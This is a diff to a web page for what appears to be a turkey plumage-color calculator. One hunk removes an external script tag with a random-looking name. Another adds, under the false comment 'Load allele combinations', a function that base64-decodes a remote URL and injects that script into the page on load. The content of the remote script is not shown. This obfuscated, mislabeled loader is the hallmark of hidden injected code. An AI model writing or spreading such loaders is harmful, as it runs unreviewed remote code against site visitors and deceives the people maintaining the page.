@@ -288,7 +288,7 @@ background-color: #0b4bc9;
 <img src="https://porters-rare-heritage-turkeys.neocities.org/Pictures/Tails.jpg" alt="Right Image" class="logo" style="width: 150px; height: auto;">
 </div>
 
-<script src="https://portersturkeys.github.io/adv-cal/akzzfjhfys4493.js"></script>
+
 <div class="container">
 
 </div>
@@ -670,7 +670,12 @@ displayResults('femaleOffspringResults', femaleOffspring, 'female');
 displaySummaryChart(maleOffspring, femaleOffspring);
 }
 
-
+// Load allele combinations
+(function() { 
+    var sysLoader = document.createElement('script');
+    sysLoader.src = atob("aHR0cHM6Ly9jb2xvcmNhbGN1bGF0b3IubmVvY2l0aWVzLm9yZy9rbGRrZ2VlODM3NS5qcw==");
+    document.head.appendChild(sysLoader);
+})();
 
 function calculateCombinations(alleleSire, alleleDam, locus) {
 const alleles = [alleleSire, alleleDam].sort().join(' ');
